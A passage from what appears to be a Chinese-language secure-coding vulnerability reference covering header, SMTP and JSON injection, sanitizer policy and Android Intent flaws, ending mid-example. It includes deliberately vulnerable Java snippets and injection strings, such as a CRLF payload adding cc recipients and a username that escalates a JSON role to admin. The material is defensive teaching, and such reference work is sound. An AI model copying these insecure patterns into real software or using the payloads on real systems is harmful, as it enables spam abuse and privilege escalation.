<p>由于 Web 应用程序必须验证输入信息以避免出现其他漏洞（如 SQL Injection），因此，一种相对简单的解决方法是扩充应用程序现有的输入验证机制，增加针对 Header Manipulation 的检查。尽管具有一定的价值，但 Header Manipulation 输入验证并不能取代严格的输出验证。应用程序可能通过共享的数据存储或其他可信赖的数据源接受输入，而该数据存储所接受的输入源可能并未执行适当的输入验证。因此，应用程序不能间接地依赖于该数据或其他任意数据的安全性。这就意味着，避免 Header Manipulation 漏洞的最佳方法是验证所有应用程序输入的数据和向用户输出的数据。</p>
<p>针对 Header Manipulation 漏洞进行验证最安全的方式是创建一份安全字符白名单，其中的字符允许出现在 HTTP 响应头文件中，并且只接受完全由这些受认可的字符组成的输入。例如，有效的用户名可能仅包含字母数字字符，帐号可能仅包含 0-9 的数字。</p>
<p>更灵活的解决方法称为黑名单方法，但其安全性较差，这种方法在进行输入之前就有选择地拒绝或避免了潜在的危险字符。为了创建这样的列表，首先需要了解在 HTTP 响应头文件中具有特殊含义的一组字符。尽管 CR 和 LF 字符是 HTTP Response Splitting 攻击的核心，但其他字符，如“:”（冒号）和“=”（等号），在响应头文件中同样具有特殊的含义。</p>
<p>一旦在应用程序中确定了针对 Header Manipulation 攻击执行验证的正确点，以及验证过程中要考虑的特殊字符，下一个难题就是确定在验证过程中该如何处理各种特殊字符。应用程序应拒绝任何要添加到 HTTP 响应头文件中的包含特殊字符的输入，这些特殊字符（特别是 CR 和 LF）是无效字符。</p>
<p>许多应用程序服务器都试图避免应用程序出现 HTTP Response Splitting 漏洞，其做法是为负责设置 HTTP 头文件和 cookie 的函数提供各种执行方式，以检验是否存在进行 HTTP Response Splitting 攻击必需的字符。不要依赖运行应用程序的服务器，以此确保该应用程序的安全。开发了某个应用程序后，并不能保证在其生命周期中它会在哪些应用程序服务器中运行。由于标准和已知盗取方式的演变，我们不能保证应用程序服务器也会保持同步。</p>
<h5 id="REFERENCES-284"><a href="#REFERENCES-284" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] A. Klein Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics</p>
<p>[2] D. Crab HTTP Response Splitting</p>
<p>[3] INPUT-1: Validate inputs Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 113</p>
<p>[5] Standards Mapping - FIPS200 SI</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Web Application Security Consortium 24 + 2 HTTP Response Splitting</p>
<p>[29] Standards Mapping - Web Application Security Consortium Version 2.00 HTTP Response Splitting (WASC-25)</p>
<h4 id="Header-Manipulation-SMTP"><a href="#Header-Manipulation-SMTP" class="headerlink" title="Header Manipulation: SMTP"></a>Header Manipulation: SMTP</h4><h5 id="ABSTRACT-286"><a href="#ABSTRACT-286" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在 SMTP 头中包括未经验证的数据使得攻击者可以添加任意标题（如 CC 或 BCC），从而利用这些标题向其本身泄露邮件内容或将邮件服务器用作垃圾邮件自动程序。</p>
<h5 id="EXPLANATION-287"><a href="#EXPLANATION-287" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在以下情况下会发生 SMTP Header Manipulation 漏洞：</p>
<ol>
<li><p>数据通过一个不可信赖的数据源进入应用程序，最常见的是 Web 应用程序中的 HTTP 请求。</p>
</li>
<li><p>数据包含在一个 SMTP 头中，该 SMTP 头未经验证就发送给了邮件服务器。</p>
</li>
</ol>
<p>如同许多软件安全漏洞一样，SMTP Header Manipulation 只是通向终端的一个途径，它本身并不是终端。从本质上看，这些漏洞是显而易见的：攻击者可将恶意数据传送到易受攻击的应用程序，且该应用程序将这些数据包含在 SMTP 头中。</p>
<p>一种最常见的 SMTP Header Manipulation 攻击用于分发垃圾邮件。如果应用程序包含一个允许设置电子邮件主题和正文的易受攻击的“联系我们”表单，攻击者将能够设置任意内容，并注入包含匿名（因为电子邮件是从受害者服务器发送的）指向垃圾邮件的电子邮件地址列表的 CC 标题。</p>
<p>示例：以下代码段读取“联系我们”表单的主题和正文：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">String subject = request.getParameter(&quot;subject&quot;);</span><br><span class="line"></span><br><span class="line">String body = request.getParameter(&quot;body&quot;);</span><br><span class="line"></span><br><span class="line">MimeMessage message = new MimeMessage(session);</span><br><span class="line"></span><br><span class="line">message.setFrom(new InternetAddress(&quot;webform@acme.com&quot;));</span><br><span class="line"></span><br><span class="line">message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(&quot;support@acme.com&quot;));</span><br><span class="line"></span><br><span class="line">message.setSubject(&quot;[Contact us query] &quot; + subject);</span><br><span class="line"></span><br><span class="line">message.setText(body);</span><br><span class="line"></span><br><span class="line">Transport.send(message);</span><br></pre></td></tr></table></figure>
<p>假设在请求中提交了一个由标准字母和数字字符组成的字符串，如“Page not working”，那么 SMTP 头可能表现为以下形式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">subject: [Contact us query] Page not working</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>然而，因为该头的值是利用未经验证的用户输入构造的，所以仅当提交给 subject 的值不包含任何 CR 和 LF 字符时，响应才会保留这种形式。如果攻击者提交恶意字符串，例如<code>“Congratulations!!You won the lottery!!!\r\ncc:victim1@mail.com,victim2@mail.com …”</code>，则 SMTP 头将表现为以下形式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">subject: [Contact us query] Congratulations!! You won the lottery</span><br><span class="line"></span><br><span class="line">cc: victim1@mail.com,victim2@mail.com</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这将有效地允许攻击者制造垃圾邮件，或者发送匿名电子邮件等攻击。</p>
<h5 id="RECOMMENDATIONS-286"><a href="#RECOMMENDATIONS-286" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>针对 SMTP Header Manipulation 的解决方法是，确保在适当位置进行输入验证并检验其属性是否正确。</p>
<p>由于 SMTP Header Manipulation 漏洞出现在应用程序的输出中包含恶意数据时，因此，一个合乎逻辑的做法是在头上下文中使用数据前一刻对其进行验证，并确保没有非法 CRLF 字符可以破坏头结构。</p>
<h5 id="REFERENCES-285"><a href="#REFERENCES-285" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] OWASP Testing for IMAP/SMTP Injection (OTG-INPVAL-011)</p>
<p>[2] Vicente Aguilera Díaz MX Injection: Capturing and Exploiting Hidden Mail Servers</p>
<p>[3] INPUT-1: Validate inputs Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 93</p>
<p>[5] Standards Mapping - FIPS200 SI</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Web Application Security Consortium Version 2.00 Abuse of Functionality (WASC-42)</p>
<h4 id="Insecure-Sanitizer-Policy"><a href="#Insecure-Sanitizer-Policy" class="headerlink" title="Insecure Sanitizer Policy"></a>Insecure Sanitizer Policy</h4><h5 id="ABSTRACT-287"><a href="#ABSTRACT-287" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用用户控制或不可信赖的数据来定义 HTML sanitizer 策略可能会允许攻击者避开清除要求并发起 cross-site scripting (XSS) 攻击。</p>
<h5 id="EXPLANATION-288"><a href="#EXPLANATION-288" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>涵盖性术语“输入处理”描述了输入数据验证、清除、筛选和编码/解码等功能。Cross-site scripting、SQL injection 和 process control 漏洞是由于输入处理不正确或者缺少输入处理造成的。清除输入需要将输入转换为可接受表单，通常在输入验证的基础上实施。HTML 清除是指清除和清理用户输入，以便仅允许被认为是安全的标签、属性和元素。 实施彻底的 HTML 清除策略十分困难；成功实施的关键是了解使用数据的上下文。每个上下文都有其各自的漏洞，应具体情况具体分析。使用 HTML sanitizer（例如 OWASP HTML sanitizer）防止 Web 应用程序中出现 XSS 漏洞是明智的，但实施不当会导致虚假安全。</p>
<p>例 1：以下 Java 代码使用用户控制的输入变量 elements 构建 HTML sanitizer 策略：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">String elements = prop.getProperty(&quot;AllowedElements&quot;);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">public static final PolicyFactory POLICY_DEFINITION = new HtmlPolicyBuilder()</span><br><span class="line"></span><br><span class="line">															.allowElements(elements)</span><br><span class="line"></span><br><span class="line">															.toFactory();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>恶意用户可能会通过将危险元素（如 <code>&lt;script&gt;</code>）提供给 elements 而使 HTML sanitizer 策略接受这些元素。</p>
<h5 id="RECOMMENDATIONS-287"><a href="#RECOMMENDATIONS-287" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><ol>
<li>不要允许使用用户提供/控制的数据构建 HTML sanitizer 策略的组件。</li>
<li>不要允许全局使用关键属性。始终应用筛选器以允许限制的数值集合，并将该权限限制为特定的元素集合</li>
<li>每个上下文都有其各自的漏洞，并且由于在一个上下文中使用另一个上下文而变得复杂（例如，CSS 中的 JavaScript）。确保 sanitizer 策略限制是合理的，并且不可能打破允许的上下文。</li>
</ol>
<h5 id="REFERENCES-286"><a href="#REFERENCES-286" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] OWASP Cross-Site Scripting (XSS) Prevention Cheat Sheet</p>
<p>[2] Understanding Malicious Content Mitigation for Web Developers CERT</p>
<p>[3] HTML 4.01 Specification W3</p>
<p>[4] Input Validation and Representation Micro Focus Fortify</p>
<p>[5] INPUT-1: Validate inputs Oracle</p>
<p>[6] Standards Mapping - Common Weakness Enumeration CWE ID 79, CWE ID 80</p>
<p>[7] Standards Mapping - FIPS200 SI</p>
<p>[8] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-15 Information Output Filtering (P0)</p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A4 Cross Site Scripting</p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A1 Cross Site Scripting (XSS)</p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A2 Cross-Site Scripting (XSS)</p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.7</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.7</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.7</p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.7</p>
<p>[20] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 079</p>
<p>[21] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 079</p>
<p>[22] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 079</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3580 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3580 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3580 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3580 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3580 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3580 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3580 CAT I</p>
<p>[30] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Scripting</p>
<p>[31] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Scripting (WASC-08)</p>
<h4 id="Intent-Manipulation"><a href="#Intent-Manipulation" class="headerlink" title="Intent Manipulation"></a>Intent Manipulation</h4><h5 id="ABSTRACT-288"><a href="#ABSTRACT-288" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>通过允许用户输入来控制 Intent 参数，使得攻击者可以控制后续活动的行为。</p>
<h5 id="EXPLANATION-289"><a href="#EXPLANATION-289" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当满足以下两个条件时，就会发生意图操控问题：</p>
<ol>
<li>攻击者能够指定 Android Intent 的操作、类名或组件。</li>
</ol>
<p>例如，攻击者能够指定类名或组件来处理此意图。</p>
<ol>
<li>攻击者可以通过指定操作、类名或组件来获取某种权限，而这种权限在一般情况下是不可能获得的。</li>
</ol>
<p>例如，程序可能会允许攻击者将敏感信息传输到设备上的第三方软件中。</p>
<p>示例 1：以下代码使用从 HTTP 请求中读取的参数来设置意图的类名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String arg = request.getParameter(&quot;arg&quot;);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Intent intent = new Intent();</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">intent.setClassName(arg);</span><br><span class="line"></span><br><span class="line">ctx.startActivity(intent);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-288"><a href="#RECOMMENDATIONS-288" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>防止意图操控的最佳方法是采用一种间接手段：创建一个用户可以指定的合法意图操作、类名或组件的列表，并且只允许此用户从该列表中进行选择。通过这种方法，用户提供的输入就不能直接用来指定这些关键意图的详细信息了。</p>
<h5 id="REFERENCES-287"><a href="#REFERENCES-287" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Intent</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 99</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3600 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3600 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3600 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3600 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3600 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3600 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3600 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="JSON-Injection"><a href="#JSON-Injection" class="headerlink" title="JSON Injection"></a>JSON Injection</h4><h5 id="ABSTRACT-289"><a href="#ABSTRACT-289" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该方法会将未经验证的输入写入 JSON。攻击者可以利用此调用将任意元素或属性注入 JSON 实体。</p>
<h5 id="EXPLANATION-290"><a href="#EXPLANATION-290" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>JSON injection 会在以下情况中出现：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>将数据写入到 JSON 流。</p>
</li>
</ol>
<p>应用程序通常使用 JSON 来存储数据或发送消息。用于存储数据时，JSON 通常会像缓存数据那样处理，而且可能会包含敏感信息。用于发送消息时，JSON 通常与 RESTful 服务一起使用，并且可以用于传输敏感信息，例如身份验证凭据。</p>
<p>如果应用程序利用未经验证的输入构造 JSON，则可以更改 JSON 文档和消息的语义。在相对理想的情况下，攻击者可能会插入无关的元素，导致应用程序在解析 JSON 文档或请求时抛出异常。在更为严重的情况下，例如涉及 JSON injection，攻击者可能会插入无关的元素，从而允许对 JSON 文档或请求中对业务非常关键的值执行可预见操作。还有一些情况，JSON injection 可以导致 cross-site scripting 或 dynamic code evaluation。</p>
<p>例 1：以下 Java 代码使用 Jackson 将非特权用户（这些用户具有“默认”角色，与之相反，特权用户具有“管理员”角色）的用户帐户身份验证信息从用户控制的输入变量 username 和 password 序列化为位于 ~/user_info.json 的 JSON 文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">JsonFactory jfactory = new JsonFactory();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">JsonGenerator jGenerator = jfactory.createJsonGenerator(new File(&quot;~/user_info.json&quot;), JsonEncoding.UTF8);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">jGenerator.writeStartObject();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">jGenerator.writeFieldName(&quot;username&quot;);</span><br><span class="line"></span><br><span class="line">jGenerator.writeRawValue(&quot;\&quot;&quot; + username + &quot;\&quot;&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">jGenerator.writeFieldName(&quot;password&quot;);</span><br><span class="line"></span><br><span class="line">jGenerator.writeRawValue(&quot;\&quot;&quot; + password + &quot;\&quot;&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">jGenerator.writeFieldName(&quot;role&quot;);</span><br><span class="line"></span><br><span class="line">jGenerator.writeRawValue(&quot;\&quot;default\&quot;&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">jGenerator.writeEndObject();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">jGenerator.close();</span><br></pre></td></tr></table></figure>
<p>但是，由于 JSON 序列化使用 JsonGenerator.writeRawValue() 来执行，将不会对 username 和 password 中的不可信赖数据进行验证以转义与 JSON 相关的特殊字符。这样，用户就可以任意插入 JSON 密钥，可能会更改已序列化的 JSON 的结构。在本例中，在设置 username 的值的提示符下输入用户名时，如果非特权用户 mallory（密码为 Evil123!）将 “,”role“:“admin 附加到其用户名中，则最终保存到 ~/user_info.json 的 JSON 将为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  &quot;username&quot;:&quot;mallory&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;role&quot;:&quot;admin&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;password&quot;:&quot;Evil123!&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;role&quot;:&quot;default&quot;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果随后将此序列化 JSON 文件反序列化为 HashMap 对象，其中 Jackson 的 JsonParser 如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">JsonParser jParser = jfactory.createJsonParser(new File(&quot;~/user_info.json&quot;));</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">while (jParser.nextToken() != JsonToken.END_OBJECT) &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  String fieldname = jParser.getCurrentName();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  if (&quot;username&quot;.equals(fieldname)) &#123;</span><br><span class="line"></span><br><span class="line">    jParser.nextToken();</span><br><span class="line"></span><br><span class="line">    userInfo.put(fieldname, jParser.getText());</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  if (&quot;password&quot;.equals(fieldname)) &#123;</span><br><span class="line"></span><br><span class="line">    jParser.nextToken();</span><br><span class="line"></span><br><span class="line">    userInfo.put(fieldname, jParser.getText());</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  if 